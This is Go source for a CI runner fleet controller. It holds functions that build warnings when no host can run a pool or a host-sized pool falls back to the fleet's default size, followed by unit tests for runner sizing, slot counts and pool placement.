// that did it, in the same words the pool's explanation and the 409 on a host
// edit use, because "no eligible host" with no reasons is the complaint an
// operator cannot act on.
//
// A pool no host could run for reasons that have nothing to do with profiles --
// a selector that matches nothing, a backend nobody offers -- is the existing
// explanations' to give; this entry exists for the new reason, and lists the
// others beside it only so the whole picture is one sentence.
func noEligibleHostProblem(hosts []*store.Host, p *store.Pool) (Problem, bool) {
	var lines []string
	byProfile := 0
	for _, h := range hosts {
		if scheduler.HostCouldRun(h, p) {
			return Problem{}, false
		}
		code, reason := HostRefusal(h, p)
		if code == ExcludedProfile {
			byProfile++
		}
		if len(lines) < maxListedHosts {
			lines = append(lines, hostLabel(h)+": "+reason)
		}
	}
	if byProfile == 0 {
		return Problem{}, false
	}
	more := ""
	if n := len(hosts) - len(lines); n > 0 {
		more = fmt.Sprintf(" (and %s more)", plural(n, "host"))
	}
	return Problem{
		Code:     "pool.no_eligible_host",
		Severity: config.SeverityWarning,
		Title:    fmt.Sprintf("pool %s has no host that can run it", p.Name),
		Detail: fmt.Sprintf("No host can run this pool, and %d of the %s are kept off it by their runner profiles: %s%s. It looks healthy and starts no runner while this holds.",
			byProfile, plural(len(hosts), "host"), strings.Join(lines, "; "), more),
		Fix:        "change those hosts' minimum or standard runner size, or this pool's size or minimum, or add a host whose profile suits it.",
		TargetKind: "pool",
		TargetID:   p.ID,
	}, true
}

// profileDefaultProblem is a pool that asked to be sized by its host, placed on
// hosts whose profiles name no standard size: they run it at the fleet's
// default, which is the same figure on a four-core box and a sixty-four-core
// one, and the pool did not ask for a figure that is the same everywhere.
//
// A pool the controller keeps for a size class is not one of these: it asked for
// that class's runner, which is the figure that differs by the size of the host
// because the host's class does, and a host that names no standard of its own is
// exactly what it was made for.
func profileDefaultProblem(hosts []*store.Host, p *store.Pool, fleet config.Runners) (Problem, bool) {
	if !p.SizeFromProfile || p.FromHosts() {
		return Problem{}, false
	}
	var names []string
	for _, h := range hosts {
		if h.RunnerProfile.Standard.Sized() || !scheduler.HostCouldRun(h, p) {
			continue
		}
		names = append(names, hostLabel(h))
	}
	if len(names) == 0 {
		return Problem{}, false
	}
	slices.Sort(names)
	cpus, memoryMB := fleet.DefaultRunnerSize()
	listed := names
	more := ""
	if len(listed) > maxListedHosts {
		more = fmt.Sprintf(" and %s more", plural(len(names)-maxListedHosts, "host"))
		listed = listed[:maxListedHosts]
	}
	return Problem{
		Code:     "pool.profile_default",
		Severity: config.SeverityInfo,
		Title:    fmt.Sprintf("pool %s takes its size from its host, and some hosts name none", p.Name),
		Detail: fmt.Sprintf("%s have no standard runner size in their profile (%s%s), so this pool's runners there are the fleet's default of %s CPU and %s -- the same on a small machine and a large one. The pool asked to be sized by the host, and these hosts have not said how.",
			plural(len(names), "host"), strings.Join(listed, ", "), more, scheduler.FormatCPUs(cpus), formatRoomMB(memoryMB)),
		Fix:        "give each of those hosts a standard runner size on its card, or set runners.default_cpus and runners.default_memory_mb to the size most of them should run.",
		TargetKind: "pool",
		TargetID:   p.ID,
	}, true
}

package controller

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/backend"
	"github.com/eyupio/zoomies/internal/config"
	"github.com/eyupio/zoomies/internal/scheduler"
	"github.com/eyupio/zoomies/internal/store"
)

// profile gives a host its runner profile through the one write an operator's
// edit takes, and reads the host back, so a test sees what the next pass will.
func (h *harness) profile(host *store.Host, p store.RunnerProfile) *store.Host {
	h.t.Helper()
	if err := h.st.PatchHost(h.ctx, host.ID, store.HostChanges{RunnerProfile: &p}); err != nil {
		h.t.Fatalf("PatchHost: %v", err)
	}
	got, err := h.st.GetHost(h.ctx, host.ID)
	if err != nil {
		h.t.Fatal(err)
	}
	return got
}

// profilePool is a pool that takes its size from the host, wanting n runners.
func (h *harness) profilePool(inst *store.Installation, name string, n int) *store.Pool {
	h.t.Helper()
	p := h.pool(inst, name)
	p.MinRunners, p.MaxRunners, p.SizeFromProfile = n, max(n, 4), true
	if err := h.st.UpdatePool(h.ctx, p); err != nil {
		h.t.Fatalf("UpdatePool: %v", err)
	}
	return p
}

var bigProfile = store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8192}}

// The size a profile pool's runner is given is the host's standard, the row
// says where it came from, and the agent is told "host" -- one that predates
// the value would otherwise read it as a size somebody typed and give a
// docker-in-docker pair's daemon the whole of it on top of the runner's.
func TestAProfilePoolGetsTheSizeItsHostNamesAndTheAgentIsToldHost(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	h.profilePool(inst, "linux-x64", 1)
	host := h.profile(h.measuredHost("big", 12, 32768, 8, enforcesEverything), bigProfile)

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	h.c.lifecycleCalls.Wait()
	r := h.onlyRunner()
	if r.AllocatedCPUs != 3 || r.AllocatedMemoryMB != 8192 || r.AllocationSource != store.AllocationFromProfile {
		t.Fatalf("row allocation = %v CPUs, %d MB from %q; want 3, 8192 from %q",
			r.AllocatedCPUs, r.AllocatedMemoryMB, r.AllocationSource, store.AllocationFromProfile)
	}
	task := h.taskOfKind(host.ID, agent.TaskCreateRunner)
	if task.Spec == nil {
		t.Fatal("the create task carries no spec")
	}
	if task.Spec.Resources.CPUs != 3 || task.Spec.Resources.MemoryMB != 8192 {
		t.Fatalf("task spec = %+v; the agent would apply something other than what the row records", task.Spec.Resources)
	}
	if task.Spec.ResourcesSource != store.AllocationFromHost {
		t.Fatalf("the agent is told the source is %q, want %q: an older agent reads any other as typed",
			task.Spec.ResourcesSource, store.AllocationFromHost)
	}
	if view := h.c.runnerView(h.ctx, r); view.AllocationSource != store.AllocationFromProfile {
		t.Fatalf("the Runners page says %q, want the profile named", view.AllocationSource)
	}
}

func TestAProfilePoolOnAHostWithNoStandardGetsTheFleetsDefaultSize(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	h.profilePool(inst, "linux-x64", 1)
	h.measuredHost("plain", 12, 32768, 8, enforcesEverything)

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	h.c.lifecycleCalls.Wait()
	r := h.onlyRunner()
	cpus, memoryMB := config.Default().Runners.DefaultRunnerSize()
	if r.AllocatedCPUs != cpus || r.AllocatedMemoryMB != memoryMB || r.AllocationSource != store.AllocationFromProfile {
		t.Fatalf("row allocation = %v CPUs, %d MB from %q; want the fleet's default %v and %d, called a profile size",
			r.AllocatedCPUs, r.AllocatedMemoryMB, r.AllocationSource, cpus, memoryMB)
	}
}

// The slot count a standard gives is what a pass fills a host to, whatever
// capacity the operator set beside it.
func TestAPassFillsAProfiledHostToItsDerivedSlots(t *testing.T) {
	h := newHarness(t)
	// Credentials are minted one at a time by default, which would spread the
	// three creates over three passes; the count is what is under test.
	h.c.UpdateConfig(func(cfg *config.Config) { cfg.Scheduler.RegistrationConcurrency = 8 })
	inst := h.installation()
	h.profilePool(inst, "linux-x64", 8)
	h.profile(h.measuredHost("big", 12, 32768, 8, enforcesEverything), bigProfile)

	if err := h.c.Reconcile(h.ctx); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	h.c.lifecycleCalls.Wait()
	if got := len(h.runners()); got != 3 {
		t.Fatalf("%d runners created, want the 3 that 11.4 CPUs and 30 GB hold at 3 CPUs and 8 GB", got)
	}
}

// A host with no profile and a pool that says nothing about one are sized as
// they always were: that is the compatibility promise, held at the one place
// the controller hands a pool to the scheduler.
func TestSizingAPoolCarriesTheFleetsFiguresOnlyWhereTheyApply(t *testing.T) {
	fleet := config.Default().Runners
	plain := &store.Pool{ID: "pool_a", Name: "a"}
	if got := sizingPool(plain, fleet); got != plain {
		t.Fatal("a pool that inherits nothing was copied")
	}

	fleet.MinimumCPUs, fleet.MinimumMemoryMB = 1, 1024
	got := sizingPool(plain, fleet)
	if got == plain || got.Resources.MinCPUs != 1 || got.FleetMinimum.CPUs != 1 || got.FleetMinimum.MemoryMB != 1024 {
		t.Fatalf("an inherited minimum was not carried and marked as the fleet's: %+v / %+v", got.Resources, got.FleetMinimum)
	}
	if plain.Resources.MinCPUs != 0 || plain.FleetMinimum != (store.RunnerSize{}) {
		t.Fatal("sizing wrote the fleet's figures into the stored pool")
	}

	own := &store.Pool{ID: "pool_b", Name: "b", Resources: store.Resources{MinCPUs: 2, MinMemoryMB: 2048}}
	if got := sizingPool(own, fleet); got != own {
		t.Fatalf("a pool that set its own minimum was copied: %+v", got)
	}

	profile := &store.Pool{ID: "pool_c", Name: "c", SizeFromProfile: true}
	got = sizingPool(profile, config.Default().Runners)
	cpus, memoryMB := config.Default().Runners.DefaultRunnerSize()
	if got == profile || got.FleetStandard != (store.RunnerSize{CPUs: cpus, MemoryMB: memoryMB}) {
		t.Fatalf("a pool sized by its host was not given the fleet's default: %+v", got.FleetStandard)
	}
	if profile.FleetStandard != (store.RunnerSize{}) {
		t.Fatal("the default was written into the stored pool")
	}
}

// What the host's own page shows: the slots its standard gives and what sets
// them, and every figure with whose it is, so an empty field reads as "follows
// the fleet" and not as nothing.
func TestAHostViewSaysWhereEachFigureOfItsProfileCameFrom(t *testing.T) {
	h := newHarness(t)
	h.c.UpdateConfig(func(cfg *config.Config) {
		cfg.Runners.MinimumCPUs, cfg.Runners.MinimumMemoryMB = 0.5, 512
	})
	host := h.profile(h.measuredHost("big", 12, 32768, 2, enforcesEverything), store.RunnerProfile{
		Minimum:  store.RunnerSize{CPUs: 1},
		Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8192, BurstMaxCPUs: 6},
	})

	v := h.c.HostView(host)
	if v.Slots != 2 || v.SlotsLimitedBy != "capacity" {
		t.Errorf("slots = %d limited by %q, want 2 limited by capacity: the machine holds 3 and the operator allows 2", v.Slots, v.SlotsLimitedBy)
	}
	if v.RunnerProfile == nil || v.RunnerProfile.Standard.CPUs != 3 {
		t.Errorf("the profile as the operator wrote it is missing: %+v", v.RunnerProfile)
	}
	min, std := v.EffectiveProfile.Minimum, v.EffectiveProfile.Standard
	if min.CPUs != 1 || min.CPUsSource != scheduler.SourceHost || min.MemoryMB != 512 || min.MemoryMBSource != scheduler.SourceGlobal {
		t.Errorf("effective minimum = %+v: CPU is the host's, memory follows the fleet", min)
	}
	if std.CPUs != 3 || std.CPUsSource != scheduler.SourceHost || std.MemoryMB != 8192 || std.MemoryMBSource != scheduler.SourceHost ||
		std.BurstMaxCPUs != 6 || std.BurstMaxCPUsSource != scheduler.SourceHost {
		t.Errorf("effective standard = %+v", std)
	}

	// No profile: the view says nothing was written, and the effective
	// figures are the fleet's with their source.
	plain := h.c.HostView(h.measuredHost("plain", 8, 16384, 4, enforcesEverything))
	if plain.RunnerProfile != nil || plain.Slots != 4 || plain.SlotsLimitedBy != "" {
		t.Errorf("an unprofiled host reads as profiled: %+v, %d slots limited by %q", plain.RunnerProfile, plain.Slots, plain.SlotsLimitedBy)
	}
	defCPUs, defMemory := h.cfg.Runners.DefaultRunnerSize()
	if got := plain.EffectiveProfile.Standard; got.CPUs != defCPUs || got.MemoryMB != defMemory || got.CPUsSource != scheduler.SourceGlobal {
		t.Errorf("an unprofiled host's standard = %+v, want the fleet's default from %q", got, scheduler.SourceGlobal)
	}
	if plain.EffectiveProfile.Standard.BurstMaxCPUs != 0 || plain.EffectiveProfile.Standard.BurstMaxCPUsSource != "" {
		t.Errorf("a host with no ceiling shows one: %+v", plain.EffectiveProfile.Standard)
	}
}

func TestWhatSetsAHostsSlotsIsNamed(t *testing.T) {
	for _, tc := range []struct {
		name     string
		host     store.Host
		slots    int
		limit    string
		profiled bool
	}{
		{"no standard", store.Host{CPUs: 12, MemoryMB: 32768, Capacity: 4}, 4, "", false},
		{"CPU holds fewer than memory", store.Host{CPUs: 12, MemoryMB: 65536, Capacity: 8,
			RunnerProfile: store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 4, MemoryMB: 4096}}}, 2, "cpu", true},
		{"memory holds fewer than CPU", store.Host{CPUs: 32, MemoryMB: 16384, Capacity: 8,
			RunnerProfile: store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 1, MemoryMB: 8192}}}, 1, "memory", true},
		{"capacity is the lower", store.Host{CPUs: 12, MemoryMB: 32768, Capacity: 2,
			RunnerProfile: store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8192}}}, 2, "capacity", true},
		{"the two agree", store.Host{CPUs: 12, MemoryMB: 32768, Capacity: 3,
			RunnerProfile: store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8192}}}, 3, "", true},
		{"paused", store.Host{CPUs: 12, MemoryMB: 32768, Capacity: 0,
			RunnerProfile: store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 3, MemoryMB: 8192}}}, 0, "", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			slots, limit := hostSlots(&tc.host)
			if slots != tc.slots || limit != tc.limit {
				t.Fatalf("hostSlots = %d limited by %q, want %d limited by %q", slots, limit, tc.slots, tc.limit)
			}
		})
	}
}

// A pool that states its size is never raised by a host whose minimum is above
// it: the host is left out, the refusal is its own code with the limit named,
// and editing a host's minimum above the last size a pool could run is refused
// like any other edit that strands a pool.
func TestAHostMinimumAboveAPoolsStatedSizeLeavesTheHostOutAndRefusesTheStrandingEdit(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "small")
	pool.Resources = store.Resources{CPUs: 2, MemoryMB: 2048}
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatal(err)
	}
	host := h.measuredHost("big", 12, 32768, 8, enforcesEverything)

	// Before: the pool runs there. The proposed edit raises the host's minimum
	// above the pool's size, which would leave it nowhere.
	proposed := *host
	proposed.RunnerProfile.Minimum = store.RunnerSize{CPUs: 3}
	got, err := h.c.HostStrandings(h.ctx, &proposed)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Pool != pool.Name || got[0].Code != ExcludedProfile {
		t.Fatalf("strandings = %+v, want the one pool, refused for its profile", got)
	}
	if !strings.Contains(got[0].Reason, "minimum runner size is 3 CPU") || !strings.Contains(got[0].Reason, "above the 2 CPU") {
		t.Errorf("the refusal does not name the limit: %q", got[0].Reason)
	}

	// Saved anyway, the wizard's count and the pool's room say the same thing.
	saved := h.profile(host, proposed.RunnerProfile)
	fit, err := h.c.HostFit(h.ctx, pool)
	if err != nil {
		t.Fatal(err)
	}
	if fit.Count != 0 || len(fit.Excluded) != 1 || fit.Excluded[0].Code != ExcludedProfile {
		t.Fatalf("fit = %+v, want no host and one excluded for its profile", fit)
	}
	if !strings.Contains(fit.Detail, "big cannot run it") {
		t.Errorf("the explanation does not name the host: %q", fit.Detail)
	}
	room, err := h.c.PoolRoom(h.ctx, pool)
	if err != nil {
		t.Fatal(err)
	}
	if len(room.Hosts) != 1 || room.Hosts[0].ExcludedBy != ExcludedProfile || room.Hosts[0].Room != 0 ||
		!strings.Contains(room.Hosts[0].Excluded, "minimum runner size") {
		t.Fatalf("room = %+v, want the host listed with no room and the limit that did it", room.Hosts)
	}
	if room.Runners != 0 {
		t.Errorf("room counts %d runners on a host the pool is not allowed on", room.Runners)
	}
	if code, _ := HostRefusal(saved, pool); code != ExcludedProfile {
		t.Errorf("HostRefusal code = %q, want %q", code, ExcludedProfile)
	}
}

// A host the profile keeps a pool off is listed with its reason, and then takes
// no part in what the room says about where the pool lands. Counted as a host
// "promising more slots than it can back" it would send an operator to lower the
// capacity of a machine that is working as set, and counted among the hosts the
// pool "can land on" it would inflate the sentence about the room it has.
func TestAHostTheProfileKeepsAPoolOffIsNotOvercommittedAndNotAHostItLandsOn(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	pool := h.pool(inst, "small")
	pool.Resources = store.Resources{CPUs: 2, MemoryMB: 2048}
	pool.MinRunners, pool.MaxRunners = 0, 6
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatal(err)
	}
	// Eight slots and a 3 CPU minimum above the pool's 2: kept off.
	h.profile(h.measuredHost("big", 12, 32768, 8, enforcesEverything), store.RunnerProfile{
		Minimum: store.RunnerSize{CPUs: 3},
	})
	// Two slots on 3.5 CPUs at 2 each: it can back one, so this one is
	// overcommitted, and is the only host that should be named as such.
	h.measuredHost("ok", 4, 8192, 2, enforcesEverything)

	room, err := h.c.PoolRoom(h.ctx, pool)
	if err != nil {
		t.Fatal(err)
	}
	if len(room.Hosts) != 2 || len(room.Placeable()) != 1 || room.Placeable()[0].Host != "ok" {
		t.Fatalf("hosts = %+v, placeable = %+v; want both listed and only ok placeable", room.Hosts, room.Placeable())
	}
	var over, above *Problem
	warnings := PoolRoomWarnings(pool, room)
	for i := range warnings {
		switch warnings[i].Code {
		case "pool.host_overcommitted":
			over = &warnings[i]
		case "pool.max_above_room":
			above = &warnings[i]
		}
	}
	if over == nil || !strings.Contains(over.Detail, "ok (2 slots, room for 1)") || strings.Contains(over.Detail, "big") {
		t.Errorf("overcommitted warning = %+v, want it to name ok and not big", over)
	}
	if above == nil || !strings.Contains(above.Detail, "the 1 host it can land on has room for 1 runner") {
		t.Errorf("max-above-room warning = %+v, want it to count the one host the pool can land on", above)
	}
}

// The standing problems are raised only where a profile is in play, so a fleet
// that never uses one sees the same list after the upgrade.
func TestThePoolsAProfileLeavesWithoutAHostAreAProblemAndAFleetDefaultIsSaid(t *testing.T) {
	h := newHarness(t)
	inst := h.installation()
	heavy := h.profilePool(inst, "heavy", 0)
	heavy.Resources.MinCPUs = 3
	if err := h.st.UpdatePool(h.ctx, heavy); err != nil {
		t.Fatal(err)
	}
	h.profile(h.measuredHost("small-a", 4, 16384, 4, enforcesEverything),
		store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 1.5, MemoryMB: 4096}})
	h.profile(h.measuredHost("small-b", 4, 16384, 4, enforcesEverything),
		store.RunnerProfile{Standard: store.RunnerStandard{CPUs: 1.5, MemoryMB: 4096}})

	got := h.problemsByCode()
	p, ok := got["pool.no_eligible_host"]
	if !ok {
		t.Fatalf("no pool.no_eligible_host among %v", h.problemCodes())
	}
	for _, want := range []string{"small-a: its standard runner is 1.5 CPU", "small-b:", "below this pool's minimum of 3 CPU"} {
		if !strings.Contains(p.Detail, want) {
			t.Errorf("the problem %q does not say %q", p.Detail, want)
		}
	}
	if p.TargetKind != "pool" || p.TargetID != heavy.ID {
		t.Errorf("the problem is about %s %s, want the pool", p.TargetKind, p.TargetID)
	}
	if _, also := got["pool.profile_default"]; also {
		t.Error("the default-size note was raised for a pool no host can run")
	}

	// A host that names no standard runs a profile pool at the fleet's default,
	// and the note says which hosts and what the figure is.
	free := h.profilePool(inst, "free", 0)
	h.measuredHost("plain", 8, 16384, 4, enforcesEverything)
	got = h.problemsByCode()
	note, ok := got["pool.profile_default"]
	if !ok || note.TargetID != free.ID || note.Severity != config.SeverityInfo {
		t.Fatalf("pool.profile_default = %+v (present %v), want an info entry about the free pool", note, ok)
	}
	if !strings.Contains(note.Detail, "plain") || !strings.Contains(note.Detail, "2 CPU and 4 GB") {
		t.Errorf("the note does not name the host and the default: %q", note.Detail)
	}
}

